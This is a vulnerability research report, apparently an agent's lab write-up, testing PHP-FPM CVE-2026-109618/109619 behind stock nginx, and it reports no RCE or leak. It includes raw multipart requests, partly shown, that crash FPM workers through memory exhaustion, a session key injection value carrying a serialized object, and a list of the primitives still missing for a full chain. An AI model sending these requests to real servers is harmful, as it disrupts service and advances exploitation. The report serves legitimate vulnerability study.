# CVE-2026-109618/109619 — stock nginx + PHP-FPM: negative result

**Date:** 2026-10-23
**Lab:** `/tmp/opencode/research/fpm_109619_20261023T010421Z/`
**Status: INCOMPLETE — NO STOCK nginx+FPM RCE, NO LEAK, NO PRODUCER→CONSUMER SAME-WORKER PAIR.**
This is a measured negative result plus source verification, not a claim of exploitability.

## 0. Verdict

- Stock nginx + PHP-FPM (multi-worker, ASLR on, stock 1 MiB nginx body limit,
  `post_max_size=8M`, `display_errors=Off`) did **not** yield RCE or an info leak.
- The known A1/A2 producers are **startup OOMs**. FPM converts
  `php_request_startup()==FAILURE` into `php_module_shutdown()` and
  `FPM_EXIT_SOFTWARE` (70): the worker that holds the dangling
  `PS(id)`/`PS(http_session_vars)` state is destroyed before any consumer can
  run in it.
- The exact B1 body is **33,128,677 bytes**, over `post_max_size=8,388,608`,
  and over stock nginx's 1 MiB limit. The exact body is 413 at stock nginx and
  `post=0` at a 64 MiB diagnostic front end.
- Stock nginx has no upstream affinity: six keep-alive requests alternated
  workers 40/15. Same-worker pinning was only observed with the non-stock
  `fastcgi_keep_conn on` + upstream keepalive diagnostic.
- The only in-band session-file write lead (upload-progress key containing
  `|`) is **source-blocked** by the session serializer's `memchr(...,'|',...)`
  check in all four affected versions. The lab measurement is **inconclusive**
  and is not cited as a measured block (a no-`|` control also ended as a
  0-byte session file because `session.upload_progress.cleanup=1` deletes the
  key at END, and nginx buffered the body).
- 8.2.34 and 8.3.35 were **source-verified only** (same FPM startup-failure
  fragment and same serializer check). They were not run as FPM here; the
  `m109-*`/`mw109619-*` containers for those versions belong to other workers
  and were not touched.

## 1. Scope, versions, fix

- Affected (per task): PHP 8.2.34, 8.3.35, 8.4.26, 8.5.11.
- Fixed (per task): 8.2.35, 8.3.36, 8.4.27, 8.5.12.
- Fix commit: `506e87fa7dcdd306975e5b8f8265ee03527aacbf`.
- Fix behaviors relevant here (from `/tmp/opencode/fix.diff`):
  - `php_basic_early_rinit()` resets `BG(serialize_lock)`, `BG(serialize)`,
    `BG(unserialize)` and the URL scanner early.
  - `PG(modules_activated)` gates the rfc1867 session handler for
    `request_parse_body()`.
  - `php_rinit_session_globals()` at `MULTIPART_EVENT_START`.
  - `$_SESSION` removed from `$GLOBALS` at `MULTIPART_EVENT_END`.
  - `PG(http_globals)` set to `ZVAL_UNDEF` after destruction.
- Public sources only; no credentials; no push/commit/PR/advisory.

## 2. Builds and topology (measured)

| Component | Exact build / SAPI | Image |
|---|---|---|
| FPM 8.4.26 | `PHP 8.4.26 (fpm-fcgi) (built: Oct 21 2026 00:31:28) (NTS)` | `php:8.4.26-fpm`, sha256 `9f0837de65e3c405aca0d0c00a1a54d0fce759d2d08f2742387c1ed4a711283b` |
| FPM 8.5.11 | `PHP 8.5.11 (fpm-fcgi) (built: Oct 21 2026 00:25:43) (NTS)` | `php:8.5.11-fpm`, sha256 `1937cefa540c57724e7c55104728b2d7f6bd298b825746fcb1592b82c72dd77f` |
| nginx | `nginx/1.31.8` | `nginx:alpine`, sha256 `3d6cab9c2941df2441024a2f02a65ebe1b8916c3cbe7b9527f62627accea8004` |

Stock INI (official image's `php.ini`, i.e. `php.ini-production` content):

```
max_execution_time = 30
memory_limit = 128M
display_errors = Off
variables_order = "GPCS"
post_max_size = 8M
upload_max_filesize = 2M
```

FPM pool (`www.conf`): `pm=dynamic`, `pm.max_children=5`,
`pm.start_servers=2`, `pm.min_spare_servers=1`, `pm.max_spare_servers=3`.
The single-worker control used `pm=static`, `pm.max_children=1`.

Port / container map:

| Port | Container | Meaning |
|---|---|---|
| 18710 | `f619-web8426` | 8.4.26, **stock 1 MiB** nginx front end (no `client_max_body_size`) |
| 18720 | `f619-web8426x` | 8.4.26, **64 MiB diagnostic** front end |
| 18761 | `f619-web8426nb` | 8.4.26, 64 MiB + `fastcgi_request_buffering off` diagnostic |
| 18762 | `f619-web8426s` | 8.4.26, 64 MiB + single-worker FPM (`f619-fpm8426s`) |
| 18763 | `f619-web8426kc` | 8.4.26, 64 MiB + `fastcgi_keep_conn on` + upstream keepalive (non-stock) |
| 18711 | `f619-web8511` | 8.5.11, stock 1 MiB |
| 18721 | `f619-web8511x` | 8.5.11, 64 MiB diagnostic |

FPM IPs: `f619-fpm8426` = 172.20.0.2:9000; `f619-fpm8511` =
172.20.0.3:9000; `f619-fpm8426s` = 172.20.0.9:9000.

8.2.34 / 8.3.35: **source only** in this run. `php-src` tags were inspected;
no dedicated stock FPM container was started. The `m109-*` containers for
those versions are another worker's and were excluded.

## 3. Source fact: startup OOM exits the FPM worker

All four tags contain the same FPM main-loop fragment. Line numbers for
`fcgi_finish_request(request, 1)` / the preceding `if`:

| Version | `if (php_request_startup() == FAILURE)` | `fcgi_finish_request(request, 1)` |
|---|---|---|
| 8.2.34 | 1873 | 1874 |
| 8.3.35 | 1875 | 1876 |
| 8.4.26 | 1871 | 1872 |
| 8.5.11 | 1838 | 1839 |

The fragment:

```c
if (UNEXPECTED(php_request_startup() == FAILURE)) {
    fcgi_finish_request(request, 1);
    SG(server_context) = NULL;
    php_module_shutdown();
    return FPM_EXIT_SOFTWARE;
}
```

`php_request_startup()` catches the startup OOM bailout in its own `zend_try`
and returns `FAILURE`. `php_request_shutdown()` / module RSHUTDOWN never run on
that path. `FPM_EXIT_SOFTWARE` is 70. This is the measured behavior below.

## 4. Test matrix

`RCE` = remote code execution; `crash` = FPM worker exits (exit 70) and
nginx returns 502; `413` = nginx rejected; `post_max_size` = PHP rejected the
body (`post=0`); `no body` = PHP saw no body; `no leak` = no memory/ID leak.
No timeouts were observed.

| # | Case | Version | Worker mode | Front end | Result |
|---|---|---|---|---|---|
| 1 | A1, 1,060,211 B | 8.4.26 | dynamic 5 | stock 1m (18710) | **413** (`client intended to send too large body: 1060211 bytes`) |
| 2 | A1, 1,060,211 B | 8.4.26 | dynamic 5 | 64m (18720) | **crash**: 502; `Allowed memory size of 134217728 bytes exhausted`; child 7 exit 70 after 42.019604 s; child 15 respawned |
| 3 | A2, 279,369 B | 8.4.26 | dynamic 5 | stock 1m (18710) | **crash**: 502; nginx `upstream sent unexpected FastCGI record: 3`; fresh repeat at 01:38:54 same 502, worker set 213/473 → 486/487; same body at 64m gave child 8 exit 70 (row 4) |
| 4 | A2, 279,369 B | 8.4.26 | dynamic 5 | 64m (18720) | **crash**: 502; child 8 exit 70 after 194.068173 s; child 40 respawned |
| 5 | A1, 1,060,211 B | 8.5.11 | dynamic 5 | 64m (18721) | **crash**: 502; child 8 exit 70 after 266.128294 s; child 19 respawned |
| 6 | A2, 279,369 B | 8.5.11 | dynamic 5 | 64m (18721) | **crash**: 502; child 7 exit 70 after 266.748352 s; child 30 respawned |
| 7 | A1, 1,060,211 B | 8.4.26 | **static 1** (18762) | 64m single-worker | **crash**: 502; only worker 7 → 17 (exit 70 after 3.464094 s) |
| 8 | A2, 279,369 B | 8.4.26 | **static 1** (18762) | 64m single-worker | **crash**: 502; only worker 17 → 27 (exit 70 after 0.648232 s) |
| 9 | B1, 33,128,677 B | 8.4.26 | dynamic 5 | stock 1m (18710) | **413** (`client intended to send too large body: 33128677 bytes`) |
| 10 | B1, 33,128,677 B | 8.4.26 | dynamic 5 | 64m (18720) | **post_max_size**: HTTP 200, `pid=61 post=0 files=0 cl='33128677' te=NULL`; no OOM |
| 11 | 34,603,086 B chunked B-fill | 8.4.26 | dynamic 5 | 64m (18720) | **post_max_size**: HTTP 200, `pid=62 post=0 files=0 cl='34603086' te='chunked'`; warning `POST Content-Length of 34603086 bytes exceeds the limit of 8388608 bytes` |
| 12 | 33 MB chunked B-fill | 8.4.26 | dynamic 5 | nobuf (18761) | **no body**: HTTP 200, `pid=15 post=0 files=0 cl='' te='chunked'` |
| 13 | 2 MB chunked | 8.4.26 | dynamic 5 | stock 1m (18710) | **413** (`client intended to send too large chunked body: 1048576+65536 bytes`) |
| 14 | 6 keep-alive GETs | 8.4.26 | dynamic 5 | stock 1m (18710) | workers **40/15/40/15/40/15** — no affinity |
| 15 | 6 keep-alive GETs | 8.4.26 | dynamic 5 | keepconn (18763, non-stock) | worker **40** for all 6 — affinity only with non-stock config |
| 16 | upload-progress key with `\|` | 8.4.26 | dynamic 5 | 64m (18720) | final session file 0 B; no-`\|` control also 0 B; **inconclusive**; source `memchr` check |
| 17 | `.user.ini` with `memory_limit=64M` / `cleanup=0` | 8.4.26 | dynamic 5 | 64m (18720) | **not applied**: `memory_limit=128M`, `cleanup='1'`; file removed |
| 18 | source gates | 8.2.34 / 8.3.35 | n/a | n/a | **source-verified only**; no FPM run |

The 8.4.26 A1/A2 response timestamps match the exit log lines:
`work/a1_8426.resp` 502 at 01:06:50 ↔ child 7 exit at 01:06:50;
`work/a2_8426.resp` 502 at 01:09:22 ↔ child 8 exit at 01:09:22.
The 8.5.11 responses likewise: `a1_8511.resp` 502 at 01:10:34 ↔ child 8;
`a2_8511.resp` 502 at 01:10:35 ↔ child 7.

## 5. Raw requests

All bodies use multipart boundary `CCCCCCCCCC` (10 `C`s). Bodies are preserved
under `bodies/`; the exact B1 is under the prior 9bie lab (read-only).

### 5.1 Best case: A2, 279,369 B, fits stock 1 MiB and `post_max_size`

Request (to the stock 1 MiB front end):

```http
POST /index.php HTTP/1.1
Host: 127.0.0.1:18710
Content-Type: multipart/form-data; boundary=CCCCCCCCCC
Content-Length: 279369

--CCCCCCCCCC
Content-Disposition: form-data; name="PHPSESSID"

aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
--CCCCCCCCCC
Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"

k0
--CCCCCCCCCC
Content-Disposition: form-data; name="000"

x
...
```

Body shape (parsed): 997 parts, max 62 `[a]` suffixes, 880 nested empty-file
parts (`files[Rxxxxx][a]...`, `filename=""`,
`Content-Type: application/octet-stream`), 115 3-character filler fields, one
2-byte progress value, 32-byte PHPSESSID; total 279,369 B.

```
body:   bodies/a2.bin
size:   279,369
sha256: 7af66c8f35c5fa6b47a539da6dca361d19543d9f62d61e4af891c2802bd5e236
```

Response at stock 1 MiB front end: **502 Bad Gateway** (157 B), nginx error
log:

```
2026/10/23 01:31:29 [warn] 21#21: *13 a client request body is buffered to a temporary file /var/cache/nginx/client_temp/0000000003 ...
2026/10/23 01:31:29 [error] 21#21: *13 upstream sent unexpected FastCGI record: 3 while reading response header from upstream, client: 172.20.0.1, server: _, request: "POST /index.php HTTP/1.1", upstream: "fastcgi://172.20.0.2:9000", host: "127.0.0.1:18710"
```

A fresh repeat at 01:38:54 gave the same 502 and the worker set changed
(213/473 → 486/487). The direct exit-code line for this front-end run was not
visible in `docker logs` (buffered), but the identical body at the 64 MiB
front end produced the directly logged `child 8 exited with code 70` below.

### 5.2 Same A2 at the 64 MiB diagnostic front end (exit-70 evidence)

```http
POST /index.php HTTP/1.1
Host: 127.0.0.1:18720
Content-Type: multipart/form-data; boundary=CCCCCCCCCC
Content-Length: 279369

<same bodies/a2.bin>
```

Response: 502 at 01:09:22. FPM log:

```
NOTICE: PHP message: PHP Fatal error:  Allowed memory size of 134217728 bytes exhausted (tried to allocate 20480 bytes) in Unknown on line 0
[23-Oct-2026 01:09:22] WARNING: [pool www] child 8 exited with code 70 after 194.068173 seconds from start
[23-Oct-2026 01:09:22] NOTICE: [pool www] child 40 started
```

### 5.3 Worst case: exact B1, 33,128,677 B

```http
POST /upload.php HTTP/1.1
Host: 127.0.0.1:18710
Content-Type: multipart/form-data; boundary=CCCCCCCCCC
Content-Length: 33128677

--CCCCCCCCCC
Content-Disposition: form-data; name="PHPSESSID"

a
--CCCCCCCCCC
Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"

k0
--CCCCCCCCCC
Content-Disposition: form-data; name="f0000fff..."
...
```

```
body:   /tmp/opencode/research/9bie_fullchain_multiw_20261022T130520Z/bodies/b1_800k.bin
size:   33,128,677
sha256: b6c547e0e9a2bb26607df1521de96f4d5c9adf4621c28b7ab491587b21ae40f2
```

Stock 1 MiB front end: **413 Request Entity Too Large**; nginx log
`client intended to send too large body: 33128677 bytes`.

64 MiB diagnostic front end: **HTTP 200**, `pid=61 post=0 files=0
cl='33128677' te=NULL reql=NULL` — PHP rejected the body because
33,128,677 > 8,388,608; no OOM and no state.

### 5.4 Synthetic 34,603,086-byte chunked body (the measured >8M warning)

```http
POST /upload.php HTTP/1.1
Host: 127.0.0.1:18720
Transfer-Encoding: chunked
Content-Type: application/octet-stream

<34,603,086 bytes of B-fill, chunked>
```

```
body:   work/big33m.bin
size:   34,603,086
sha256: 8bf554ee754b7ca414dd6e8f595146ea4eea76974b8319dab510fa495b4ccb34
```

Response: HTTP 200, `pid=62 post=0 files=0 cl='34603086' te='chunked'
reql=NULL`. FPM warning (saved in `receipts/final/post_max_size_warning.txt`):

```
NOTICE: PHP message: PHP Warning:  PHP Request Startup: POST Content-Length of 34603086 bytes exceeds the limit of 8388608 bytes in Unknown on line 0
```

With `fastcgi_request_buffering off` (18761), the same 33 MB chunked body
gives `pid=15 post=0 files=0 cl='' te='chunked'`: no `CONTENT_LENGTH` reaches
PHP, so PHP reads nothing.

### 5.5 A1, 1,060,211 B (stock 1 MiB 413; 64 MiB exit 70)

```http
POST /index.php HTTP/1.1
Host: 127.0.0.1:18710
Content-Type: multipart/form-data; boundary=CCCCCCCCCC
Content-Length: 1060211

--CCCCCCCCCC
Content-Disposition: form-data; name="PHPSESSID"
...
```

```
body:   bodies/a1.bin
size:   1,060,211
sha256: 8e8fc166e6b326d20bb7611d8ef3cee3bd5da46447985312c1492ab0a44d1eb6
```

Stock 1 MiB: **413** (`too large body: 1060211 bytes`).
64 MiB: 502; child 7 exit 70 after 42.019604 s; child 15 respawned.

## 6. Producer → consumer worker attribution

**No producer→consumer pair reached the same FPM worker.**

- In the direct A1/A2 runs, the producer request itself is the only request in
  that worker. The worker exits 70; the master respawns a new PID; a later
  request cannot see the producer's state.
  - 8.4.26: child 7 exit 70 / child 15 started (A1); child 8 exit 70 / child 40
    started (A2).
  - 8.5.11: child 8 exit 70 / child 19 started (A1); child 7 exit 70 / child 30
    started (A2).
  - Single-worker control (the cleanest proof routing is not the blocker):
    only worker 7 → 17 after A1, 17 → 27 after A2; both requests 502. The
    consumer cannot run in the producer's process because the process is gone.
- Stock nginx has no upstream affinity. Six sequential keep-alive requests on
  one client connection hit workers `40, 15, 40, 15, 40, 15`
  (`receipts/s6_keepalive_stock.txt`).
- The non-stock `fastcgi_keep_conn on` + `upstream ... keepalive 8` diagnostic
  kept the same client connection on worker 40 for all six requests
  (`receipts/s7_keepconn.txt`). This is a diagnostic, not a stock claim.
- Therefore the stock route to a same-worker consumer is missing. The only
  diagnostic that pins a worker requires non-stock nginx directives.

## 7. Blockers (exact)

1. **`post_max_size=8,388,608` vs B1=33,128,677.**
   The exact B1 is 33,128,677 B. At the 64 MiB front end PHP accepts the
   request line but rejects the body: `post=0`, `cl='33128677'`. The measured
   34,603,086 B proxy logs `POST Content-Length of 34603086 bytes exceeds the
   limit of 8388608 bytes`. B1 cannot be the startup/END producer under stock
   `post_max_size` without a smaller amplification or a body-cap bypass.
2. **Stock nginx `client_max_body_size` default 1 MiB.**
   A1 1,060,211 B → 413; exact B1 33,128,677 B → 413; 2 MB chunked → 413
   (`chunked body: 1048576+65536 bytes`). Only A2 (279,369 B) fits both gates,
   and it still kills the worker.
3. **`exit 70` on startup failure.**
   The startup OOM is caught by `php_request_startup()` → `FAILURE`; FPM calls
   `fcgi_finish_request(request,1)`, `php_module_shutdown()`, returns
   `FPM_EXIT_SOFTWARE` (70). The dangling session globals die with the process.
4. **`fastcgi_request_buffering off`.**
   With buffering off, nginx forwards the chunked body without
   `CONTENT_LENGTH`; FPM sees `cl='' te='chunked'` and PHP reads no body
   (`post=0`). This is not a producer.
5. **Session serializer `|` check.**
   `memchr(ZSTR_VAL(key), PS_DELIMITER, ZSTR_LEN(key))` rejects any session
   key/value containing `|` in the `php` serializer:
   8.2.34:974, 8.3.35:994, 8.4.26:1086, 8.5.11:1075. This source-blocks the
   upload-progress key-injection lead. The lab measurement is inconclusive
   (0-byte final files for both the `|` and no-`|` controls; cleanup=On and
   nginx buffering), so no measured block is claimed.
6. **No same-worker affinity under stock nginx.**
   Alternating workers 40/15; only non-stock keepconn pins 40.
7. **No leak channel under `display_errors=Off`.**
   No OOB `PS(id)`/session content was returned in a header or body; the only
   leak-like behavior was a stderr FastCGI record (record type 3) that nginx
   reports as a 502, not a leak.
8. **8.2.34/8.3.35 not measured.**
   Source-verified from tags only; the dedicated containers belong to other
   workers and were excluded. No claim of a measured FPM run for those two.
9. **Stock app level.**
   Stock WordPress 7.1.3 core has no PHP `session_start()` call (only strings
   in site-health text). MediaWiki 1.46.2 calls `session_start()` in
   Setup/SessionBackend, but its session store is server-side and no
   unauth attacker-controlled large/pathological serialized value was found.
   This app-level producer was not validated end-to-end.

## 8. Session upload-progress lead (source-only block; measurement inconclusive)

- A multipart request with `PHPSESSID=injtest1` and
  `PHP_SESSION_UPLOAD_PROGRESS=inj1|O:8:"stdClass":...` was sent to 8.4.26.
  The final `/tmp/sess_injtest1` was 0 bytes.
- A control with `PHP_SESSION_UPLOAD_PROGRESS=ok1` (no `|`) **also** ended as a
  0-byte `/tmp/sess_oktest1`. `session.upload_progress.cleanup=1` deletes the
  progress key and flushes the session at END, so a 0-byte final file is the
  expected stock result for both the rejected and accepted key.
- A slow-upload attempt did not expose a mid-request non-empty file (nginx
  buffers the request body; the update window is too short to observe with
  `docker exec`).
- Therefore the **only** defensible statement is the source check
  `memchr(...,'|',...)` in all four versions. The lab test is **inconclusive**,
  not a measured rejection.

## 9. Exact missing primitive

**A startup-time corruption that FPM survives** (so the worker does not take
the `php_request_startup()==FAILURE` → `php_module_shutdown()` →
`FPM_EXIT_SOFTWARE` path), **or a post-RINIT producer that leaves
`PS(id)`/`PS(http_session_vars)`/`BG(unserialize)` dangling across
`php_request_shutdown` in a worker that stays alive**, **plus a consumer
routed to that same worker under stock nginx** (all-worker spray or a stock
affinity primitive), **plus a leak channel under `display_errors=Off`**.

The known A1/A2 producers are startup OOMs; FPM destroys the worker, so the
mod_php-shaped dangling state is never consumable. The Chain-E-style
post-RINIT producer would leave `BG(unserialize)` stale, but it needs an
app-level, attacker-controlled OOM-amplifying `session_start()`/`unserialize()`
input; stock WordPress has no PHP sessions and stock MediaWiki's session is not
attacker-controlled/large in the unauth path. The upload-progress session-file
write is source-blocked by the `|` check. B1 is over `post_max_size` and stock
nginx's 1 MiB. Stock nginx has no affinity; the only affinity observed was the
non-stock keepconn configuration. No leak was obtained.

## 10. Reproducibility

- Test bodies: `bodies/a1.bin`, `bodies/a2.bin`, `work/big33m.bin`; exact B1
  at `/tmp/opencode/research/9bie_fullchain_multiw_20261022T130520Z/bodies/b1_800k.bin`.
- Generators: `work/repo/pure/mk_a1.py`, `work/repo/pure/cheap_oom_a.py`,
  `work/repo/pure/mk_leak_b.py`.
- Conf: `conf/web8426.conf` (stock 1 MiB), `conf/web8426_64m.conf`,
  `conf/web8426_nobuf.conf`, `conf/web8426_keepconn.conf`,
  `conf/web8426s.conf`, `conf/web8511.conf`, `conf/web8511_64m.conf`,
  `conf/fpm/www-single.conf`.
- Helpers: `scripts/send.py`, `scripts/keepalive.py`, `scripts/workers.sh`.
- Receipts: `receipts/final/` (build, source gates, exact B1 responses,
  post_max_size warning, worker lists, measurements),
  `receipts/s2_8511/` (8.5.11), `receipts/s3_single8426/` (single worker),
  `receipts/s6_keepalive_stock.txt`, `receipts/s7_keepconn.txt`.
- Source gates: `/tmp/opencode/php-src-full` tags; fix diff `/tmp/opencode/fix.diff`.

## 11. Constraints

- No push, commit, PR, or advisory was made. The workspace is not a git repo.
- Only `f619-*` containers were used. `m109-*` / `mw109619-*` were not touched.
- No service was restarted beyond the isolated lab containers; no shared
  service was modified.
- The 8.2.34/8.3.35 rows are source-verified, not FPM-measured; the report
  does not claim otherwise.

## 12. Bottom line

**No stock nginx+FPM RCE or leak was obtained. The run is incomplete at the
producer primitive: the known startup OOM producers kill the FPM worker
(exit 70), B1/33 MB bodies are blocked by `post_max_size` and stock nginx 1 MiB,
stock nginx has no same-worker affinity, and the upload-progress session write
is source-blocked by the `|` serializer check. The missing primitive is a
surviving-worker dangling-session/`BG(unserialize)` corruption plus a
same-worker consumer and a leak under `display_errors=Off`.**
